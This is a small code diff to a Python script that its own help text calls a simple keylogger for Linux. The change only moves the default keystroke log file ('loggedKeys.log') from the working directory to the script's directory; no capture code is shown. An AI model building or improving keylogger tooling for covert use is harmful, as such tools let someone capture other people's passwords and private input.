@@ -6,6 +6,7 @@
 #   
 #==============================================================================
 import os
+import sys
 from argparse import ArgumentParser
 
 
@@ -16,7 +17,7 @@ def main():
     parser = ArgumentParser(description='A simple keylogger for Linux.')
     parser.add_argument(
             '--log-file',
-            default=os.path.join(os.getcwd(), 'loggedKeys.log'),
+            default=os.path.join(os.path.dirname(os.path.realpath(sys.argv[0])), 'loggedKeys.log'),
             help='Save the output in this file.',
             )
     parser.add_argument(
